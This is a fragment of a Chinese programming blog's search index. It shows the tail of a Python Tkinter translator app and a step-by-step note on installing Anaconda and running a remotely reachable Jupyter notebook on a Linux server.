punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span>END<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>result_text<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>END<span class="token punctuation">,</span>result<span class="token punctuation">)</span>        <span class="token comment">#print(content)</span>    <span class="token keyword">def</span> <span class="token function">submit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#从输入框获取用户输入的值</span>        content <span class="token operator">=</span> self<span class="token punctuation">.</span>result_text1<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span>END<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span>        <span class="token comment">#把这个值传送给服务器进行翻译</span>        result <span class="token operator">=</span> self<span class="token punctuation">.</span>fanyi<span class="token punctuation">.</span>crawl<span class="token punctuation">(</span>content<span class="token punctuation">)</span>        <span class="token comment">#将结果显示在窗口中的文本框中</span>        self<span class="token punctuation">.</span>result_text<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span>END<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>result_text<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>END<span class="token punctuation">,</span>result<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>        <span class="token comment">#清空文本域中的内容</span>    <span class="token keyword">def</span> <span class="token function">clean</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>result_text1<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span>END<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>result_text<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span>END<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>window<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    app <span class="token operator">=</span> Application<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> web开发 </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在Linux服务器上搭建Python环境</title>
      <link href="/2020/10/17/%E5%9C%A8Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%90%AD%E5%BB%BAPython%E7%8E%AF%E5%A2%83/"/>
      <url>/2020/10/17/%E5%9C%A8Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%90%AD%E5%BB%BAPython%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h1 id="在服务器搭建Python环境"><a href="#在服务器搭建Python环境" class="headerlink" title="在服务器搭建Python环境"></a>在服务器搭建Python环境</h1><ol><li>先下载anaconda的环境，mkdir  anaconda建一个文件夹，然后cd  anaconda进入这个文件夹。</li><li>下载anaconda<pre class="line-numbers language-none"><code class="language-none">wget https://repo.anaconda.com/archive/Anaconda3-2019.03-Linux-x86_64.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>开始安装<pre class="line-numbers language-none"><code class="language-none">bash Anaconda3-2019.03-Linux-x86_64.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>初始化jupyter配置文件，记得保存这个配置文件的地址。<br>例如/root/.jupyter/jupyter_notebook_config.py</li><li>配置密码<br>先进入Python环境，输入ipython，然后再输入以下两端代码，并设置密码。<pre class="line-numbers language-none"><code class="language-none">from notebook.auth import passwdpasswd()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>把回执复制下来，然后输入exit()退出。</li><li>配置jupyter<br>用vim打开之前那个配置文件<pre class="line-numbers language-none"><code class="language-none">vim /root/.jupyter/jupyter_notebook_config.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>然后按i输入以下代码，输入:wq退出<pre class="line-numbers language-none"><code class="language-none">c.NotebookApp.ip='*'c.NotebookApp.password=u'sha1:d1ffce1b5f46:af2719a3e94a8c9d8e71a7646864923578    981af0'c.NotebookApp.open_browser = Falsec.NotebookApp.port=8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li>启动jupyter<pre class="line-numbers language-none"><code class="language-none">jupyter notebook --ip=0.0.0.0 --no-browser --allow-root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>保持jupyter一直运行<pre class="line-numbers language-none"><code class="language-none">nohup jupyter notebook --allow-root &gt; jupyter.log 2&gt;&amp;1 &amp;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>最后用ip加端口就可以打开，例如<a href="http://101.37.75.132:5555。">http://101.37.75.132:5555。</a><br><strong>大功告成</strong>🤣🤣🤣😂</li></ol>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
